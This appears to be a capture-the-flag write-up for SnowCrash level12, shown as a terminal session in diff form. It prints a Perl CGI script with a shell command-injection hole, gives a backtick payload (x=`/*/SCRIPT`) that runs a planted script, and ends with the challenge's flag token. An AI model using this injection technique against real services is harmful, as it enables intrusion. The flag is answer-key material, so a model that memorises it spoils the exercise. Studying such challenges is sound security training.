@@ -1,1 +1,38 @@
-
+< level12@SnowCrash:~$ ls
+> level12.pl
+< level12@SnowCrash:~$ cat level12.pl
+> #!/usr/bin/env perl
+> # localhost:4646
+> use CGI qw{param};
+> print "Content-type: text/html\n\n";
+> sub t {
+>   $nn = $_[1];
+>   $xx = $_[0];
+>   $xx =~ tr/a-z/A-Z/;
+>   $xx =~ s/\s.*//;
+>   @output = `egrep "^$xx" /tmp/xd 2>&1`;
+>   foreach $line (@output) {
+>       ($f, $s) = split(/:/, $line);
+>       if($s =~ $nn) {
+>           return 1;
+>       }
+>   }
+>   return 0;
+> }
+> sub n {
+>   if($_[0] == 1) {
+>       print("..");
+>   } else {
+>       print(".");
+>   }
+> }
+> n(t(param("x"), param("y")));
+# we will exploit the shell command executed at @output by making it execute a command within backquotes 
+# we will create an executable script that will redirectr getflag's result in tmp/flag
+# we have to name in uppercase because the subroutine t replaces all lowercase by uppercase letters
+# we'll bypass /tmp/ turning to uppercase by using a wildcard
+< level12@SnowCrash:~$ echo "echo \`getflag\` > /tmp/flag" > /tmp/SCRIPT
+< level12@SnowCrash:~$ chmod +x /tmp/SCRIPT
+# via our browser, we launch http://192.168.1.83:4646/?x=`/*/SCRIPT`, we backquoted the variable so the script will execute 
+< level12@SnowCrash:~$ cat /tmp/flag
+> Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
